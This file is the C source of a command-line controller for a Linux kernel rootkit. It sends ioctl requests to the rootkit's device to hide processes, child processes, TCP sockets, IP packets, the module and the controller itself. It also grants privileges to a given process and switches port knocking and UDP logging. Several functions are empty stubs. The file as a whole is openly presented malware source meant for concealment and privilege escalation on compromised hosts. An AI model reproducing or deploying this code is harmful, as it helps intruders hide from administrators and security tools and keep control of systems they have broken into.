#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <unistd.h>
#include <stropts.h>
#include <getopt.h>
#include "chardev.h"  //ioctl header file
#include "hide_socket.h"


#define HIDE_FD "hide_fd"
#define HIDE_FD_ID 0
#define UNHIDE_FD "unhide_fd"
#define UNHIDE_FD_ID 1

#define HIDE_SOCKET_TCP "hide_socket_tcp"
#define HIDE_SOCKET_TCP_ID 2
#define UNHIDE_SOCKET_TCP "unhide_socket_tcp"
#define UNHIDE_SOCKET_TCP_ID 3

#define HIDE_PS "hide_ps"
#define HIDE_PS_ID 4
#define UNHIDE_PS "unhide_ps"
#define UNHIDE_PS_ID 5

#define HIDE_MOD "hide_mod"
#define HIDE_MOD_ID 6
#define UNHIDE_MOD "unhide_mod"
#define UNHIDE_MOD_ID 7

#define HIDE_CTR "hide_control"
#define HIDE_CTR_ID 8
#define UNHIDE_CTR "unhide_control"
#define UNHIDE_CTR_ID 9

#define HIDE_PCK_V4 "hide_package_v4"
#define HIDE_PCK_V4_ID 12
#define UNHIDE_PCK_V4 "unhide_package_v4"
#define UNHIDE_PCK_V4_ID 13


#define HIDE_PCK_V6 "hide_package_v6"
#define HIDE_PCK_V6_ID 14
#define UNHIDE_PCK_V6 "unhide_package_v6"
#define UNHIDE_PCK_V6_ID 15

#define ENABLE_PORT_K "port_knocking"
#define ENABLE_PORT_K_ID 16

#define DISABLE_PORT_K "disable_port_knocking"
#define DISABLE_PORT_K_ID 17

#define UNHIDE_ROOTKIT_K "unhide_rootkit"
#define UNHIDE_ROOTKIT_K_ID 18

#define PRIVILEGE_PROCESS_K	"privilege_pid"
#define PRIVILEGE_PROCESS_ID 19

#define UDP_LOG_ON     "log_on"
#define UDP_LOG_ON_ID 20
#define UDP_LOG_OFF     "log_off"
#define UDP_LOG_OFF_ID 21

#define CHILD_PROCESS_HIDING_ON     "hide_child_pid"
#define CHILD_PROCESS_HIDING_ON_ID 22
#define CHILD_PROCESS_HIDING_OFF     "unhide_child_pid"
#define CHILD_PROCESS_HIDING_OFF_ID  23

/******************* cmd arguments *******************/

static struct option long_options[] = {
		{ HIDE_FD, required_argument, 0, HIDE_FD_ID },
		{ UNHIDE_FD, required_argument, 0, UNHIDE_FD_ID },
		{ HIDE_PCK_V4, required_argument, 0,HIDE_PCK_V4_ID },
		{ UNHIDE_PCK_V4, required_argument, 0, UNHIDE_PCK_V4_ID },
		{ HIDE_PCK_V6, required_argument, 0,HIDE_PCK_V6_ID },
		{ UNHIDE_PCK_V6, required_argument, 0, UNHIDE_PCK_V6_ID },
		{ HIDE_SOCKET_TCP, required_argument, 0, HIDE_SOCKET_TCP_ID },
		{ UNHIDE_SOCKET_TCP, required_argument, 0, UNHIDE_SOCKET_TCP_ID },
		{ HIDE_PS, required_argument, 0, HIDE_PS_ID },
		{ UNHIDE_PS, required_argument, 0, UNHIDE_PS_ID },
		{ HIDE_MOD, required_argument, 0, HIDE_MOD_ID },
		{ UNHIDE_MOD, required_argument, 0,	UNHIDE_MOD_ID },
		{ ENABLE_PORT_K, required_argument, 0,ENABLE_PORT_K_ID },
		{ UNHIDE_ROOTKIT_K, no_argument, 0, UNHIDE_ROOTKIT_K_ID},
		{ DISABLE_PORT_K, required_argument, 0,	DISABLE_PORT_K_ID },
		{ HIDE_CTR, no_argument, 0, HIDE_CTR_ID },
		{ UNHIDE_CTR, no_argument, 0, UNHIDE_CTR_ID },

                { UDP_LOG_ON, no_argument, 0, UDP_LOG_ON_ID },
                { UDP_LOG_OFF, no_argument, 0, UDP_LOG_OFF_ID },
                { CHILD_PROCESS_HIDING_ON, no_argument, 0, CHILD_PROCESS_HIDING_ON_ID },
                { CHILD_PROCESS_HIDING_OFF, no_argument, 0, CHILD_PROCESS_HIDING_OFF_ID },

		{ PRIVILEGE_PROCESS_K, required_argument, 0, PRIVILEGE_PROCESS_ID },
		{ 0, 0, 0, 0 }
};


/******************* Helper functions *******************/

int parseInt(char *string) {
	int ret;
	sscanf(string, "%d", &ret);
	return ret;

}

int sendIOCTL(unsigned long request, char *ioctl_string) {
	int fd;
	char name_file[120];
	sprintf(name_file, "%s%s", DEVICE_PATH, DEVICE_NAME);
	fd = open(name_file, O_RDWR);

	if (fd == -1) {
		fprintf(stderr,
				"Error, ioctl channel file at %s could not be opened.\n",
				name_file);
		exit(-1);
	}
	ioctl(fd, request, ioctl_string);
	close(fd);
	return 0;
}

/******************* IOCTL calls *******************/
void hide_file(char *path) {

}

void unhide_file(char *path) {

}

void hide_control() {
	unsigned long pid;
	char *path = "";

	// hide pid
	pid = getpid();

	char address[100];
	sprintf(address, "%lu", pid);
	sendIOCTL(IOCTL_SET_PID_TO_HIDE, address);

	// hide file
	hide_file(path);

}

void unhide_control() {

}

void hide_rootkit() {

}

void unhide_rootkit() {

	char address[100];
	sprintf(address, "false");
	sendIOCTL(IOCTL_HIDE_MODULE, (unsigned long) address);
}

void hide_process(unsigned long pid) {
	char address[100];
	sprintf(address, "%lu", pid);
	sendIOCTL(IOCTL_SET_PID_TO_HIDE, address);
}

void unhide_process(unsigned long pid) {
	char address[100];
	sprintf(address, "%lu", pid);
	sendIOCTL(IOCTL_RM_PID_FROM_HIDE, address);
}

void hide_module(char *name) {
	// TODO first change hide_module to hide arbitrary mods
	//sendIOCTL(IOCTL_HIDE_MODULE, name);

}

void unhide_module(char *name) {
	//sendIOCTL(IOCTL_UNHIDE_MODULE, name);
}

//TODO add udp support
void hide_socket(int port, int protocol) {

	char ioctl_string[100];
	sprintf(ioctl_string, "%d:%d", port, protocol);
	sendIOCTL(IOCTL_HIDE_SOCKET, ioctl_string);

}

void unhide_socket(int port, int protocol) {
	char ioctl_string[100];
	sprintf(ioctl_string, "%d", port);
	sendIOCTL(IOCTL_UNHIDE_SOCKET, ioctl_string);
}

void hide_packet_v4(char* ip) {
	sendIOCTL(IOCTL_HIDE_PACKETS_V4, ip);
}

void unhide_packet_v4(char* ip) {
	sendIOCTL(IOCTL_UNHIDE_PACKETS_V4, ip);
}

void hide_packet_v6(char* ip) {
	sendIOCTL(IOCTL_HIDE_PACKETS_V6, ip);
}

void unhide_packet_v6(char* ip) {
	sendIOCTL(IOCTL_UNHIDE_PACKETS_V6, ip);
}

void port_knocking_on(char* port) {
	sendIOCTL(IOCTL_ENABLE_PORT_KNOCKING, port);
}

void port_knocking_off(char *port) {
	sendIOCTL(IOCTL_DISABLE_PORT_KNOCKING, port);
}

void privilege_process(char *pid) {
	printf("giving privilges to process %s.\n", pid);
	sendIOCTL(IOCTL_PRIVILEGE_PROCESS, pid);
}

void hide_child_ps_on(void) {
	sendIOCTL(IOCTL_HIDE_CHILDREN_ON, "");
}

void hide_child_ps_off(void) {
	sendIOCTL(IOCTL_HIDE_CHILDREN_OFF, "");
}

void udp_log_on(void) {
	sendIOCTL(IOCTL_UDP_LOG_ON, "");
}

void udp_log_off(void) {
	sendIOCTL(IOCTL_UDP_LOG_OFF, "");
}

void handleInput(int c) {
	char *file_path, *name;
	printf("there is input to be handled\n");
	switch (c) {
		case HIDE_FD_ID:

			if (optarg) {
				file_path = optarg;
				hide_file(file_path);

			}

			break;

		case UNHIDE_FD_ID:

			if (optarg) {
				file_path = optarg;
				unhide_file(file_path);
			}
			break;
		case HIDE_SOCKET_TCP_ID:

			if (optarg) {
				int port = parseInt(optarg);
				if (port < 0 || port > 65535) {
					fprintf(stderr, "Error, port number wrong format in %s\n",
							HIDE_SOCKET_TCP);
				} else {
					hide_socket(port, 5);
				}
			} else {
				fprintf(stderr, "Error, missing port number in cmd %s\n",
						HIDE_SOCKET_TCP);
			}
			break;

		case UNHIDE_SOCKET_TCP_ID:

			if (optarg) {
				int port = parseInt(optarg);
				if (port < 0 || port > 65535) {
					fprintf(stderr, "Error, port number wrong format in %s\n",
							UNHIDE_SOCKET_TCP);
				} else {
					unhide_socket(port, 5); //TODO add udp and tcp support, 5);
				}
			} else {
				fprintf(stderr, "Error, missing port number in cmd %s\n",
						UNHIDE_SOCKET_TCP);
			}
			break;

		case HIDE_PS_ID:

			if (optarg) {
				int pid = parseInt(optarg);
				hide_process(pid);

			} else {
				fprintf(stderr, "Error, missing porcess id in cmd %s\n",
						HIDE_PS);
			}
			break;

		case UNHIDE_PS_ID:

			if (optarg) {
				int pid = parseInt(optarg);
				unhide_process(pid);

			} else {
				fprintf(stderr, "Error, missing porcess id in cmd %s\n",
						UNHIDE_PS);
			}
			break;

		case HIDE_MOD_ID:

			if (optarg) {
				name = optarg;
				hide_module(name);

			} else {
				fprintf(stderr, "Error, missing module name string in cmd %s\n",
						HIDE_MOD);
			}
			break;

		case UNHIDE_MOD_ID:

			if (optarg) {
				char *name = optarg;
				unhide_module(name);

			} else {
				fprintf(stderr, "Error, missing module name string in cmd %s\n",
						UNHIDE_MOD);
			}
			break;

		case HIDE_PCK_V4_ID:

			if (optarg) {
				char *ip = optarg;
				hide_packet_v4(ip);

			} else {
				fprintf(stderr, "Error, missing module name string in cmd %s\n",
						HIDE_PCK_V4);
			}
			break;
		case UNHIDE_PCK_V4_ID:

			if (optarg) {
				char *ip = optarg;
				unhide_packet_v4(ip);

			} else {
				fprintf(stderr, "Error, missing module name string in cmd %s\n",
						UNHIDE_PCK_V4);
			}
			break;

		case HIDE_PCK_V6_ID:

			if (optarg) {
				char *ip = optarg;
				hide_packet_v6(ip);

			} else {
				fprintf(stderr, "Error, missing module name string in cmd %s\n",
						HIDE_PCK_V6);
			}
			break;
		case UNHIDE_PCK_V6_ID:

			if (optarg) {
				char *ip = optarg;
				unhide_packet_v6(ip);

			} else {
				fprintf(stderr, "Error, missing module name string in cmd %s\n",
						UNHIDE_PCK_V6);
			}
			break;

		case HIDE_CTR_ID:

			hide_control();
			break;
		case UNHIDE_CTR_ID:

			unhide_control();
			break;

		case ENABLE_PORT_K_ID:
			if (optarg) {
				char *ip = optarg;
				port_knocking_on(ip);
			}
			break;
		case DISABLE_PORT_K_ID:
			if (optarg) {
				char *ip = optarg;
				port_knocking_off(ip);
			}
			break;

		case UNHIDE_ROOTKIT_K_ID:
			unhide_rootkit();
			printf("Rootkit got unhided\n");
			break;

		case PRIVILEGE_PROCESS_ID:
			if (optarg) {
				char *pid = optarg;
				privilege_process(pid);
			}
			break;

		case UDP_LOG_ON_ID:
			udp_log_on();
			break;

		case UDP_LOG_OFF_ID:
			udp_log_off();
			break;

		case CHILD_PROCESS_HIDING_ON_ID:
			hide_child_ps_on();
			break;

		case CHILD_PROCESS_HIDING_OFF_ID:
			hide_child_ps_off();
			break;
		case '?':
			printf("command not recognized \n");
			break;

		default:
			printf("?? getopt returned character code 0%o ??\n", c);
	}
}

/******************* Main *******************/

int main(int argc, char **argv) {
	int c;
	// hide this pid on load
	hide_control();

	while (1) {
		int option_index = 0;

		c = getopt_long_only(argc, argv, "", long_options, &option_index);
		if (c == -1) {
			printf("finished\n");
			break;
		}
		handleInput(c);

	}

	exit(EXIT_SUCCESS);
}
